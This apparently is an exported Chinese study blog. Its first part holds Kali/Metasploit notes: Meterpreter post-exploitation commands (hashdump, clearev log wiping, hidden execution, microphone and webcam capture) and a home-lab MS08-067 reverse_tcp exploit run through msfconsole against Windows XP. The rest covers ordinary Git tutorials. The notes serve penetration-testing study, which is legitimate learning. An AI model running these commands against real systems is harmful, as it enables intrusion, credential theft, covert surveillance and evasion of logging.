<h4 id="2-Meterpreter基本命令"><a href="#2-Meterpreter基本命令" class="headerlink" title="2. Meterpreter基本命令"></a>2. Meterpreter基本命令</h4><ul>
<li><strong><code>🔺命令：help</code></strong>：查看meterpreter可使用的命令</li>
<li><strong><code>🔺命令：background</code></strong>：回到msfconsole的界面</li>
<li><strong><code>🔺命令：pwd</code></strong>：可查看到window下的目录路径</li>
<li><strong><code>🔺命令：cd</code></strong>：进入window下一个目录</li>
<li><strong><code>🔺命令：dir/ls</code></strong>：查看本目录文件</li>
<li><strong><code>🔺命令：cat</code></strong>：查看文件内容</li>
<li><strong><code>🔺命令：mkdir/rmdir</code></strong>：创建/删除一个的目录</li>
<li><strong><code>🔺命令：mv</code></strong>：对文件进行改名</li>
<li><strong><code>🔺命令：rm</code></strong>：删除一个文件</li>
<li><strong><code>🔺命令：edit</code></strong>：编辑目标文件</li>
<li><strong><code>🔺命令：lpwd</code></strong>：local远端机器本地目录</li>
<li><strong><code>🔺命令：lcd</code></strong>：进入local远端机器本地目录的其他目录</li>
<li><strong><code>🔺命令：run</code></strong>：前端运行</li>
<li>⭐ <strong><code>🔺命令：bgrun</code></strong>：后台运行脚本<ul>
<li>▲ 有大量脚本，enum_ie/enum_share/hashdump等</li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：clearev</code></strong>：清除目标系统日志<br> -（Win+R → eventvwr → 应用程序/安全性/系统 → 一般会在系统日志留下痕迹）</li>
<li><strong><code>🔺命令：download</code></strong>：下载文件到本地系统<ul>
<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：execute -f cmd.exe -i –H</code></strong>：执行一个命令<ul>
<li>-f：执行的程序</li>
<li>-i：进行交互性shell</li>
<li>-H：程序进行隐藏</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>：查看登陆的账号</li>
<li><strong><code>🔺命令：getsystem</code></strong>：如若账号为非system，则提权为system</li>
<li><strong><code>🔺命令：getprivs</code></strong>：查看被控机器账号权限</li>
<li><strong><code>🔺命令：getproxy</code></strong>：获取被控机器浏览器设置的代理</li>
<li><strong><code>🔺命令：getpid</code></strong>：当前注入的合法进程的PID号</li>
<li><strong><code>🔺命令：migrate PID</code></strong>：可进行进程迁移</li>
<li><strong><code>🔺命令：hashdump</code></strong>：dump被控机器账号的hash值<ul>
<li><strong><code>🔺命令：run post/windows/gather/hashdump</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：sysinfo</code></strong>：系统信息</li>
<li><strong><code>🔺命令：kill PID</code></strong>：杀死进程，通过PID去杀死</li>
<li><strong><code>🔺命令：shell</code></strong>：获取操作系统的shell</li>
<li><strong><code>🔺命令：show_mount</code></strong>：挂载的操作系统分区</li>
<li>̵<strong><code>🔺命令：search -f autoexec.bat</code></strong>：搜索目录</li>
<li><strong><code>🔺命令：arp</code></strong>：查看被控机器的arp</li>
<li><strong><code>🔺命令：netstat</code></strong>：查看被控机器网络连接情况</li>
<li><strong><code>🔺命令：ifconfig/ipconfig</code></strong>：查看IP情况</li>
<li><strong><code>🔺命令：route</code></strong>：查看路由表（可添加路由表）</li>
<li><strong><code>🔺命令：idletime</code></strong>：查看被控机器当前空闲时间</li>
<li><strong><code>🔺命令：resource</code></strong>：调用外部资源文件，可为可执行的指令文件</li>
<li><strong><code>🔺命令：record_mic</code></strong>：记录被控机器麦克风的声音</li>
<li><strong><code>🔺命令： webcam_list</code></strong>：列出被控机器所以的摄像头<ul>
<li><strong><code>🔺命令：webcam_snap -i 1 -v false</code></strong>（每个一秒钟进行拍照）</li>
</ul>
</li>
</ul>
<h4 id="3-Meterpreter-Python扩展"><a href="#3-Meterpreter-Python扩展" class="headerlink" title="3. Meterpreter Python扩展"></a>3. Meterpreter Python扩展</h4><ul>
<li>2015年11月份，来自社区的贡献</li>
<li>▲ 无需运行环境，在客户端运行原生python代码</li>
<li><strong><code>🔺命令：load python</code></strong><ul>
<li><strong><code>🔺命令：Help</code></strong></li>
<li><strong><code>🔺命令：python_execute &quot;print (&#39;asdasdas&#39;)&quot;</code></strong> </li>
<li><strong><code>🔺命令：python_execute &quot;import os; cd = os.getcwd()&quot; -r cd</code></strong> </li>
<li><strong><code>🔺命令：python_import -f find.py</code></strong>  ▲ 2020.2.26 Command executed without returing a result</li>
</ul>
</li>
</ul>
<pre><code>import os
for root,dirs,files in os.walk(&quot;C:\\&quot;):
    for file in files:
        if file.endswith(&quot;.ini&quot;) and file.startswith(&quot;win&quot;):
            print(os.path.john(root.file))</code></pre><h4 id="4-实验"><a href="#4-实验" class="headerlink" title="4. 实验"></a>4. 实验</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window XP SP3主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：msconsole</code></strong><ul>
<li><strong><code>🔺命令：use exploit/windows/browser/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window Xp的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：set PAYLOAD windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
<li><strong><code>🔺命令：sessions -l</code></strong></li>
<li><strong><code>🔺命令：sessions -i 1</code></strong>（进入的是meterpreter的shell）</li>
<li><strong><code>🔺命令：meterpreter</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十九)：MSF--msfcli控制台命令</title>
    <url>/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<hr>
<h4 id="1-Msfcli"><a href="#1-Msfcli" class="headerlink" title="1. Msfcli"></a>1. Msfcli</h4><ul>
<li>2015年6月已经被取消</li>
<li>由<strong><code>🔺命令：msfconsole -x</code></strong>取代</li>
<li>编写脚本时便于引用，可调用自写的脚本</li>
<li><strong><code>🔺命令：msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/ reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit&quot;</code></strong></li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window XP SP3主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST Window XP的IP; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST Kali的IP; set LPORT 5555; set target 34; exploit&quot;</code></strong></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十八)：MSF--msfconsole控制台命令</title>
    <url>/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AB)%EF%BC%9AMSF--msfconsole%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<hr>
<h4 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h4><ul>
<li>使用前先升级：<strong><code>🔺命令：msfupdate</code></strong></li>
<li>Msfcli使用接口</li>
<li>Msfconsole使用接口<ul>
<li>最流行的用户接口</li>
<li>几乎可以使用全部MSF功能</li>
<li>控制台命令支持TAB自动补齐</li>
<li>支持外部命令的执行（系统命令等）</li>
<li>启动方式：点击鼠标启动 / <strong><code>🔺命令：msfconsole -h</code></strong> / exit<ul>
<li>-q（安静方式启动）</li>
<li>-r（资源文件）</li>
<li>-v（版本信息）</li>
</ul>
</li>
<li>help / ? / help vulns</li>
</ul>
</li>
</ul>
<h4 id="2-MSF控制台命令–基本命令"><a href="#2-MSF控制台命令–基本命令" class="headerlink" title="2. MSF控制台命令–基本命令"></a>2. MSF控制台命令–基本命令</h4><ul>
<li><strong><code>🔺命令：banner</code></strong>：MSF的banner信息，每次都有不一样的tips</li>
<li><strong><code>🔺命令：color</code></strong>：改变使用模块颜色提示</li>
<li><strong><code>🔺命令：connect -h</code></strong>：同nc，可以连接其他终端等</li>
<li><strong><code>🔺命令：show auxiliary / exploits / payloads / encoders / nops</code></strong>：显示可用资源</li>
<li><strong><code>🔺命令：search usermap_script / help search</code></strong>：搜索所需资源的位置<ul>
<li><strong><code>🔺命令：search name:mysql / path:scada / platform:aix / type:aux /author:aaron / cve:2011</code></strong>（可多条件同时搜索）</li>
</ul>
</li>
<li><strong><code>🔺命令：use dos/windows/smb/ms09_001_write</code></strong>：使用模块<ul>
<li><strong><code>🔺命令：info</code></strong>：显示模块具体信息</li>
<li><strong><code>🔺命令：show options / payloads / targets / advanced / evasion / missing</code></strong></li>
<li><strong><code>🔺命令：edit</code></strong>：对模块内容进行修改</li>
</ul>
</li>
<li><strong><code>🔺命令：check</code></strong>：探测目标服务器是否存在此漏洞利用模块的漏洞，不利用模块</li>
<li><strong><code>🔺命令：back</code></strong>：退出此漏洞利用模块</li>
<li><strong><code>🔺命令：set / unset</code></strong>：设置命令</li>
<li><strong><code>🔺命令：setg / unsetg</code></strong>：全局变量设置</li>
<li><strong><code>🔺命令：save</code></strong>：对全局变量设置的保存，文件默认保存在/root/.msf4/config</li>
<li><strong><code>🔺命令：run / exploit -j</code></strong>：前后台模式<ul>
<li>▲ 执行此模块，需设置target和payload</li>
</ul>
</li>
<li><strong><code>🔺命令：session</code></strong>：攻击成功建立的会话 <ul>
<li><strong><code>🔺命令：session -l / -i</code></strong>（Shell Meterpreter sessionVNC） </li>
</ul>
</li>
<li><strong><code>🔺命令：load / unload</code></strong>：进行外部模块的导入，如openvas/Nessus</li>
<li><strong><code>🔺命令：loadpath</code></strong>：▲ 调用自开的模块</li>
<li><strong><code>🔺命令：route</code></strong>：通过指定session路由流量，通往内网的流量</li>
<li><strong><code>🔺命令：irb</code></strong>：编程开发接口（Framework::Version）</li>
<li><strong><code>🔺命令：resource</code></strong>：导入已设置的rc资源文件（<strong><code>🔺命令：▲ msfconsole -r a.rc</code></strong>）<ul>
<li><strong><code>🔺命令：vi /root/Desktop/a.rc</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong></li>
<li><strong><code>🔺命令：set RHOST 192.168.0.121</code></strong></li>
<li><strong><code>🔺命令：set LHOST 192.168.0.107</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-MSF控制台命令–数据库指令"><a href="#3-MSF控制台命令–数据库指令" class="headerlink" title="3. MSF控制台命令–数据库指令"></a>3. MSF控制台命令–数据库指令</h4><ul>
<li><strong><code>🔺命令：db_status</code></strong>：数据库的状态</li>
<li><strong><code>🔺命令：db_rebuild_cache</code></strong>：重建缓存模块：</li>
<li><strong><code>🔺命令：db_disconnect / db_connect</code></strong>：数据库的连接<ul>
<li><strong><code>🔺命令：db_disconnect -h</code></strong>（参数）</li>
<li><strong><code>🔺命令：db_disconnect /usr/share/metasploit-framework/config/database.yml</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：db_import / db_export</code></strong>：对信息进行备份和导出：<ul>
<li><strong><code>🔺命令：db_import /root/nmap.xml</code></strong>（<strong><code>🔺命令：nmap 192.168.0.0/24 -oX</code></strong> → 导出为xml文件）</li>
<li><strong><code>🔺命令：db_export -f xml /root/bak.xml</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：db_nmap：同namp，但数据会自动保存到数据库</code></strong><ul>
<li><strong><code>🔺命令：host / host 1.1.1.1 / hosts -u（开机状态） / hosts -c（指定列的名称） address,os_flavor / -S（搜索模式）Linux/window/121/1</code></strong></li>
<li><strong><code>🔺命令：services -p 80 / services -c（指定列的名称）info,name -p 1-1000 / -S （搜索模式）</code></strong></li>
<li><strong><code>🔺命令：vulns / loot</code></strong>（hashdump）</li>
<li><strong><code>🔺命令：creds--mysql_login</code></strong>（msf存在暴力破解mysql的模块，可以进行exploit）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-9：Git常用图形化工具</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-9%EF%BC%9AGit%E5%B8%B8%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<hr>
<h4 id="1-常用工具"><a href="#1-常用工具" class="headerlink" title="1. 常用工具"></a>1. 常用工具</h4><ul>
<li>sourcetree</li>
<li>vscode</li>
<li>git图标：<a href="https://gitmoji.surge.sh" target="_blank" rel="noopener">https://gitmoji.surge.sh</a></li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-8：Git的工作流</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-8%EF%BC%9AGit%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81/</url>
    <content><![CDATA[<hr>
<h4 id="1-Git的工作流"><a href="#1-Git的工作流" class="headerlink" title="1. Git的工作流"></a>1. Git的工作流</h4><ul>
<li><a href="https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md" target="_blank" rel="noopener">Git工作流指南</a></li>
<li>集中式工作流</li>
<li>功能分支工作流</li>
<li>Gitflow工作流</li>
<li>Forking工作流</li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-7：实现Github免密推送</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-7%EF%BC%9A%E5%AE%9E%E7%8E%B0Github%E5%85%8D%E5%AF%86%E6%8E%A8%E9%80%81/</url>
    <content><![CDATA[<h4 id="1-Git传输的协议"><a href="#1-Git传输的协议" class="headerlink" title="1. Git传输的协议"></a>1. Git传输的协议</h4><ul>
<li>local协议</li>
<li>HTTP(S)协议：需要输入账号密码</li>
<li>SSH协议：不需要输入账号密码</li>
<li>Git协议</li>
<li><a href="https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">Git免密推送</a></li>
</ul>
<h4 id="2-SSH协议登陆"><a href="#2-SSH协议登陆" class="headerlink" title="2. SSH协议登陆"></a>2. SSH协议登陆</h4><ul>
<li>在个人界面的Settings处</li>
<li>SSH and GPG keys</li>
<li>generating SSH keys</li>
<li>Generating a new SSH key and adding it to the ssh-agent</li>
<li>Windows<ul>
<li>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:643008933@qq.com" target="_blank" rel="noopener">643008933@qq.com</a>“<ul>
<li>Enter a file in which to save the key (/c/Users/you/.ssh/id_rsa):[Press enter]</li>
<li>Enter passphrase (empty for no passphrase): [Type a passphrase]</li>
<li>Enter same passphrase again: [Type passphrase again]</li>
</ul>
</li>
<li>eval $(ssh-agent -s)</li>
<li>ssh-add ~/.ssh/id_rsa</li>
<li>cat ~/.ssh/id_rsa.public</li>
<li>复制公钥到New SSH Key</li>
</ul>
</li>
<li>git clone with SSH</li>
<li>touch a.txt</li>
<li>git add a.txt</li>
<li>git commit -m “add a.txt”</li>
<li>git push（看是否需要账号密码登陆）</li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-6：gitignore和fork同步</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-6%EF%BC%9Agitignore%E5%92%8Cfork%E5%90%8C%E6%AD%A5/</url>
    <content><![CDATA[<h4 id="1-gitignore-fork同步"><a href="#1-gitignore-fork同步" class="headerlink" title="1. gitignore/fork同步"></a>1. gitignore/fork同步</h4><ul>
<li>创建一个.gitignore文件，保存要忽略的内容<ul>
<li>忽略系统生成的文件，如IDE的配置</li>
<li>忽略编译生成的中间文件、可执行文件等</li>
<li>忽略敏感的配置文件和本地不想提交的脚本</li>
</ul>
</li>
<li>常用参数<ul>
<li>配置文件：.settings/</li>
<li>脚本文件：*.sh</li>
<li>上次所有txt文件：!*.txt</li>
<li>某个目录：/a/*.class</li>
</ul>
</li>
<li>gitignore网站：<a href="https://www.gitignore.io" target="_blank" rel="noopener">https://www.gitignore.io</a></li>
<li>查看远程的版本信息：<strong><code>🔺命令：git remote -v</code></strong></li>
<li>增加一个远程仓库上传流：<strong><code>🔺命令：git remote add upstream https://...</code></strong></li>
<li>更新远程仓库的版本：<strong><code>🔺命令：git fetch upstream 分支名</code></strong><ul>
<li>分支名默认省略，则为master分支</li>
<li>▲ pull = fetch + merge</li>
</ul>
</li>
<li>查看远程原始仓库的分支：<strong><code>🔺命令：git branch -r</code></strong></li>
</ul>
<h4 id="2-Git-tutorial-Repository"><a href="#2-Git-tutorial-Repository" class="headerlink" title="2. Git-tutorial Repository"></a>2. Git-tutorial Repository</h4><ul>
<li>cd git-tutorial</li>
<li>git add -A .</li>
<li>git commit -m “add gitignore”</li>
<li>git push -f</li>
<li>git clone https://……awesome</li>
<li>cd awesome</li>
<li>git remote -v</li>
<li>git remote add upstream https://…</li>
<li>git remote -v</li>
<li>git fetch upstream </li>
<li>git branch -r</li>
<li>git rebase upstream/master<ul>
<li>merge关注的是提交的历史，将两次操作合并，但无提交数据，rebase则足够</li>
</ul>
</li>
<li>git push</li>
<li>git log</li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-5：Git的回滚撤销</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-5%EF%BC%9AGit%E7%9A%84%E5%9B%9E%E6%BB%9A%E6%92%A4%E9%94%80/</url>
    <content><![CDATA[<hr>
<h4 id="1-Git的回滚撤销"><a href="#1-Git的回滚撤销" class="headerlink" title="1. Git的回滚撤销"></a>1. Git的回滚撤销</h4><ul>
<li>返回前一次的记录：<strong><code>🔺命令：git reset master^/~5/hash值id</code></strong><ul>
<li>^：每一个^符号标识[前一次]，如^^^表示回退三次</li>
<li><del>：回退次数加在后面，如</del>5</li>
<li>hash值id：回退到id号的版本</li>
<li>–mix：把暂存区的文件丢弃，但不会动到工作目录的文件（默认方式）</li>
<li>–soft：工作目录跟暂存区的文件都不会被丢弃</li>
<li>–hard：不管是工作目录以及暂存区的文件都会丢弃</li>
</ul>
</li>
<li>所有的日志文件：<strong><code>🔺命令：git reflog</code></strong></li>
<li>撤销某次操作：<strong><code>🔺命令：git revert</code></strong><ul>
<li>此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交</li>
</ul>
</li>
<li>▲ 在公用分支上应用revert，在私用分支上用reset</li>
</ul>
<blockquote>
<pre><code>reset和revert
revert：用一次新的commit来回滚之前的commit
reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre></blockquote>
<h4 id="2-Git-tutorial-Repository"><a href="#2-Git-tutorial-Repository" class="headerlink" title="2. Git-tutorial Repository"></a>2. Git-tutorial Repository</h4><ul>
<li>cd git-tutorial</li>
<li>touch hello.java</li>
<li>git add hello.java</li>
<li>git commit -m “hellp.java”</li>
<li>git dog</li>
<li>git reset master^</li>
<li>git status</li>
<li>ll</li>
<li>git add hello.java</li>
<li>git commit -m “add Hello.java”</li>
<li>git dog</li>
<li>git reset cd0309f</li>
<li>git status</li>
<li>git reset –hard 7d37397</li>
<li>git status</li>
<li>ll</li>
<li>touch c.txt</li>
<li>git add c.txt</li>
<li>git commit -m “add c.txt”</li>
<li>git dog</li>
<li>git reset –soft 7d37397</li>
<li>git status</li>
<li>git reflog</li>
<li>git reset –hard 00bd027</li>
<li>ll</li>
<li>git rest –hard HEAD</li>
<li>git dog</li>
<li>git revert</li>
<li>git log</li>
<li>git revert hash值id（Commit的ID）</li>
<li>git dog</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-4：Git的合并</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-4%EF%BC%9AGit%E7%9A%84%E5%90%88%E5%B9%B6/</url>
    <content><![CDATA[<hr>
<h4 id="1-Git的合并"><a href="#1-Git的合并" class="headerlink" title="1. Git的合并"></a>1. Git的合并</h4><ul>
<li>▲ 可以在Stackoverflow上看git log多样格式</li>
<li>▲ rebase的黄金法则：绝对不要在公共分支使用rebase</li>
<li>查看日志：git log<ul>
<li>–oneline：一行的提交信息</li>
<li>–oneline -3：只取前面3行</li>
</ul>
</li>
<li>查看添加的内容：<strong><code>🔺命令：git show 哈希值</code></strong></li>
<li>查看提交方式：<strong><code>🔺命令：git merge --help</code></strong><ul>
<li>–ff（fast-forward）：默认不产生一次commit</li>
<li>–no-ff：产生一个commit</li>
</ul>
</li>
<li>移动分支，并将master分支的提交并入：<strong><code>🔺命令：git rebase</code></strong></li>
<li>查看版本分支报错情况：<strong><code>🔺命令：git mergetool</code></strong><ul>
<li>通过工具修改后，会生成一个x.txt.orig，保存冲突的现场</li>
</ul>
</li>
</ul>
<blockquote>
<p>   merge和rebase<br>   merge：两个分支的修改提交，默认不提交，关注点在合并操作上<br>   rebase：将当前分支做的修改，复制在目标分支的最后一次中，关注点在开发的过程上 </p>
</blockquote>
<h4 id="2-Git-tutorial-Repository"><a href="#2-Git-tutorial-Repository" class="headerlink" title="2. Git-tutorial Repository"></a>2. Git-tutorial Repository</h4><ul>
<li>cd git-tutorial</li>
<li>git branch -d f1</li>
<li>git push origin :f1</li>
<li>git log</li>
<li>q</li>
<li>git log –oneline</li>
<li>git log –oneline -3</li>
<li>git show d156c23</li>
<li>vi ~/.config → dog = log –all –decorate –oneline –graph</li>
<li>git dog</li>
<li>git checkout -b f1</li>
<li>touch fa.txt</li>
<li>git add fa.txt</li>
<li>git commit -m “add fa”</li>
<li>git dog</li>
<li>git checkout master</li>
<li>git merge f1</li>
<li>git dog</li>
<li>git checkout f1</li>
<li>touch fb.txt</li>
<li>git commit -m “add fb”</li>
<li>git checkout f1</li>
<li>git merge f1 –no-ff</li>
<li>git dog</li>
<li>git push</li>
<li>git push origin f1</li>
<li>远程修改master中的a.txt</li>
<li>git pull</li>
<li>git checkout f1</li>
<li>git merge master</li>
<li>git dog</li>
<li>git checkout master</li>
<li>touch m1.txt</li>
<li>git add m1.txt</li>
<li>git commit -m “add m1”</li>
<li>git checkout f1</li>
<li>git dog</li>
<li>git rebase</li>
<li>git dog</li>
<li>git checkout -b f2</li>
<li>vim a.txt</li>
<li>this is b.txt</li>
<li>git add a.txt</li>
<li>git commit -m “update a.txt”</li>
<li>git checkout f1</li>
<li>vi a.txt</li>
<li>this is c.txt</li>
<li>git add a.txt</li>
<li>git commit -m “update c.txt”</li>
<li>git checkout f2</li>
<li>git merge f1</li>
<li>cat a.txt</li>
<li>git mergetool</li>
<li>rm a.txt.orig</li>
<li>git commit -m “update a.txt”</li>
<li>git dog</li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-3：Git的分支</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-3%EF%BC%9AGit%E7%9A%84%E5%88%86%E6%94%AF/</url>
    <content><![CDATA[<hr>
<h4 id="1-Git的分支"><a href="#1-Git的分支" class="headerlink" title="1. Git的分支"></a>1. Git的分支</h4><ul>
<li>版本发布、功能增加、错误修改</li>
</ul>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-1.PNG" srcset="/img/loading.gif" alt="3-Git分支-1"></p>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-2.PNG" srcset="/img/loading.gif" alt="3-Git分支-2"></p>
<ul>
<li>分支发布合并</li>
</ul>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-3.PNG" srcset="/img/loading.gif" alt="3-Git分支-3"></p>
<h4 id="2-Git分支操作"><a href="#2-Git分支操作" class="headerlink" title="2. Git分支操作"></a>2. Git分支操作</h4><ul>
<li>创建分支：<strong><code>🔺命令：git branch 分支名</code></strong><ul>
<li>基于某个分支创建的分支，会复制其内容</li>
</ul>
</li>
<li>查看分支：<strong><code>🔺命令：git branch</code></strong></li>
<li>跳转分支：<strong><code>🔺命令：git checkout 分支名</code></strong>   </li>
<li>创建分支并跳转：<strong><code>🔺命令：git checkout -b 分支名</code></strong></li>
<li>删除分支：<strong><code>🔺命令：git branch -d 分支名</code></strong><ul>
<li>▲ 无合并到master的分支无法删除，或者使用-D参数`**</li>
</ul>
</li>
<li>合并分支：<strong><code>🔺命令：git merge 分支名</code></strong></li>
</ul>
<h4 id="3-Git-tutorial-Repository"><a href="#3-Git-tutorial-Repository" class="headerlink" title="3. Git-tutorial Repository"></a>3. Git-tutorial Repository</h4><ul>
<li>cd git-tutorial</li>
<li>git branch feature1</li>
<li>git branch</li>
<li>git checkout feature1</li>
<li>touch a.txt</li>
<li>vim a.txt</li>
<li>this is a.txt → wq</li>
<li>git add a.txt</li>
<li>git commit -m “a.txt”</li>
<li>git branch feature2</li>
<li>git checkout feature2</li>
<li>git checkout -b feature3</li>
<li>git branch</li>
<li>git branch -d feature2</li>
<li>touch b.txt</li>
<li>vim b.txt</li>
<li>this is b.txt → wq</li>
<li>git add b.txt</li>
<li>git commit -m “b.txt”</li>
<li>git checkout master</li>
<li>git branch -d feature3</li>
<li>git merge feature3</li>
<li>git push</li>
<li>查看Github仓库是否有a.txt和b.txt，但无其他分支</li>
<li>git branch feature1</li>
<li>git push origin feature1</li>
<li>查看Github仓库是否有feature1分支</li>
<li>git push origin :feature1</li>
<li>查看Github仓库是否无feature1分支</li>
<li>git push origin feature1:f1</li>
<li>查看Github仓库的feature1是否更改为f1</li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-2：Git基本操作</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-2%EF%BC%9AGit%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<hr>
<h4 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h4><ul>
<li>下载git OXS版本（一般为内置/brew install git安装）</li>
<li>下载git WindowS版本（Git网页下载Git）</li>
<li>下载git Linux版本（apt-get install git-all/yum -y install git）</li>
</ul>
<h4 id="2-Git的基本命令"><a href="#2-Git的基本命令" class="headerlink" title="2. Git的基本命令"></a>2. Git的基本命令</h4><ul>
<li>▲ 提交到远程仓库需要在Github上创建一个仓库</li>
<li>Git的版本<ul>
<li><strong><code>🔺命令：git version</code></strong></li>
</ul>
</li>
<li>Git的用户信息<ul>
<li>名字：<strong><code>🔺命令：git config --global user.name &quot;tomas&quot;</code></strong></li>
<li>邮箱：<strong><code>🔺命令：git config --global user.email &quot;643008933@qq.com&quot;</code></strong></li>
<li>配置文件：~/.gitconfig（可设置代理，配置信息）</li>
</ul>
</li>
<li>Git的基本命令<ul>
<li>初始化：<strong><code>🔺命令：git init</code></strong></li>
<li>仓库状态：<strong><code>🔺命令：git status</code></strong></li>
<li>添加文件到暂存区管理：<strong><code>🔺命令：git add 文件名</code></strong><ul>
<li>-A，所有文件</li>
</ul>
</li>
<li>从暂存区删除文件：<strong><code>🔺命令：git rm --cacahe 文件名</code></strong></li>
<li>查看文件：<strong><code>🔺命令：..git → cat index</code></strong></li>
<li>提交：<strong><code>🔺命令：git commit -m &quot;文件名&quot;</code></strong><ul>
<li>-m：描述提交的内容</li>
</ul>
</li>
<li>建立连接：<strong><code>🔺命令：git remote add origin https://.....</code></strong></li>
<li>查看远端信息：<strong><code>🔺命令：git remote -v</code></strong></li>
<li>提交本地文件到远端服务器：<strong><code>🔺命令：git push origin master -u</code></strong><ul>
<li>origin：远端仓库名称</li>
<li>master：本地仓库名称</li>
<li>-u：后续不需要输入名称</li>
<li>:master ：删除远端的分支</li>
<li>master:m1 ：更改远端分支名称为m1</li>
</ul>
</li>
<li>克隆远程仓库到本地：<strong><code>🔺命令：git clone https://..... git-demo</code></strong><ul>
